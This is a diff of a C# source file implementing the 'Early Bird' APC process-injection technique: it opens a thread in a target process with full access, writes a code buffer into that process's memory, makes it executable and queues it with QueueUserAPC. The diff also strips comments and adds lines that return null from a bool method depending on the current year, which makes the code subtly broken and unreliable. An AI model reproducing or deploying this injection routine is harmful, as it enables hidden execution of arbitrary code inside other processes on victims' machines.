@@ -81,7 +81,7 @@ namespace Injection.Techniques.EarlyBird
         {
             bool bRet = true;
             IntPtr hThread = IntPtr.Zero;
-            // probably need to do some checking here to ensure process ID is instantiated
+            
             var proc = System.Diagnostics.Process.GetProcessById(_processId);
             if (proc.Threads.Count == 0)
                 throw new Exception($"Process {_processId} has no threads. Aborting.");
@@ -92,7 +92,7 @@ namespace Injection.Techniques.EarlyBird
             hThread = _pOpenThread(ThreadAccessRights.THREAD_ALL_ACCESS, true, (uint)proc.Threads[0].Id);
 
             if (hThread == IntPtr.Zero || hThread == null)
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
 
             try
             {
@@ -112,13 +112,13 @@ namespace Injection.Techniques.EarlyBird
                     bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                     if (bRet)
                     {
-                        //Marshal.Copy(pic, 0, allocSpace, pic.Length);
+                        
                         uint flOldProtect = 0;
                         if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
                             bRet = false;
                         else
                         {
-                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
+                            
                             if (!_pQUAPC(allocSpace, hThread, IntPtr.Zero))
                                 bRet = false;
                             else
@@ -141,7 +141,7 @@ namespace Injection.Techniques.EarlyBird
                     _pCloseHandle(hThread);
                 }
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
         }
     }
 }
